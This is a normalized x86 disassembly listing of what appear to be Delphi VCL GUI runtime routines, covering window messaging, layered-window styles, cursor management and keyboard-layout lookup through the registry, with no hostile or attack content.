cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4464d0
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c657
mov eax [ ebp - 0x4 ]
call sub_45c3b0
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45c657
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c6fb
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d938
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45d938
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_417568
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_4176b4
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4568ec
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45c740
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4431c8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45c740
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44318c
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45c7b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45c740
pop ecx
mov eax [ esi + 0x34 ]
call sub_451a8c
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_451a9c
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45c834
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4447e8
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_4034e4
sub_45c858
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_4034e4
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45c888
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4431c8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45c858
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45c888
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44318c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45c904
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45c858
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45c858
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45c888
pop ecx
test al al
je r-xdata
sub_45c958
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_4034e4
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45c988
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4431c8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45c958
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45c988
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44318c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ca04
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45c958
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45c958
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45c988
pop ecx
test al al
je r-xdata
sub_45ca58
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_417570
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44c0d4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45caac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_45ca58
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_4034e4
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cb28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41d828
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45cb64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_440194
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_440e64
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45cbac
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_4464d0
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_4464d0
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_4464d0
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_4464d0
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_4464d0
push eax
call RedrawWindow
sub_45cd00
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_457ab0
mov dl 0x5
mov eax ebx
call sub_459824
mov dl 0x1
mov eax ebx
call sub_445074
mov dl 0x3
mov eax ebx
call sub_459b20
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_45cd68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45ce3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_444f34
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_444da0
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43f1c4
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fc24
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404128
mov eax [ ebp - 0xc ]
call sub_4042f8
push eax
mov eax [ ebp - 0xc ]
call sub_4044f8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43fc34
mov eax [ ebp - 0xc ]
call sub_4042f8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ce46
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov dl 0x1
mov eax esi
call sub_458ea4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43fce0
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404684
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45ce6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4431c8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_4585c8
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_44318c
mov edx ebx
pop ecx
mov si 0xffcc
call sub_4034e4
inc ebp
dec edi
jne r-xdata
sub_45ceb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_444f34
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45cee4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44573c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45cf0c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45b274
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4464d0
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_444f34
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4464d0
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4464d0
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_444f48
or ecx 0xffffffff
mov dl 0x1
call sub_440358
pop esi
pop ebx
retn
sub_45cfa4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_445bac
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_440e64
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43f650
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_4034e4
sub_45cffc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45d0c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43fc24
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404128
mov eax [ ebp - 0x4 ]
call sub_4042f8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_43fc34
mov eax [ ebp - 0x4 ]
call sub_4042f8
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43fce0
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d0c9
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_458ea4
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404684
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45d0e8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44592c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_444f34
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_444f48
mov dl [ ebx + 0x57 ]
call sub_43fbd0
inc edi
dec esi
jne r-xdata
sub_45d18c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45d1bc
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45d1ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41d098
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45d590
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45d59c
mov eax ebx
call sub_45d5a8
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_4599c4
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420298
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420298
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420298
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_45d9c8
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45d8a4
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45d8a4
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45d8a4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_45d344
push ebx
push esi
push edi
push ebp
call sub_403674
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_4032e8
mov eax [ ebp + 0x88 ]
call sub_4032e8
mov eax [ ebp + 0x84 ]
call sub_4032e8
mov eax [ ebp + 0x54 ]
call sub_4032e8
mov eax [ ebp + 0x50 ]
call sub_4032e8
mov eax [ ebp + 0x4c ]
call sub_4032e8
mov eax [ ebp + 0x30 ]
call sub_4032e8
mov eax [ ebp + 0x34 ]
call sub_4032e8
mov eax [ ebp + 0x7c ]
call sub_4032e8
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_4032e8
mov eax ebp
call sub_45d604
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41d0e4
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40365c
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_417570
call sub_4032e8
inc edi
dec esi
jne r-xdata
sub_45d4bc
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45d508
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_417414
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_417414
mov eax [ rw-data ]
call sub_460294
sub_45d540
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4176b4
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4176b4
mov eax [ rw-data ]
call sub_460294
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_447a44
sub_45d5a8
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45d660
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45d604
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_40278c
mov ebx esi
test ebx ebx
jne r-xdata
sub_45d660
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_40276c
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_45d688
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45d833
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d83a
lea eax [ ebp - 0x260 ]
call sub_404038
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404038
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_419238
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408e98
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44b1a8
test al al
je r-xdata
xor eax eax
push ebp
push sub_45d7ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4042a8
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4042a8
sub_45d8a4
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_460104
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45feb8
mov dl 0x1
mov eax [ rw-data ]
call sub_45feb8
sub_45d910
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_45d938
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45d910
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406d00
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406c88
push eax
push edi
push 0x20
push edi
call SendMessageA
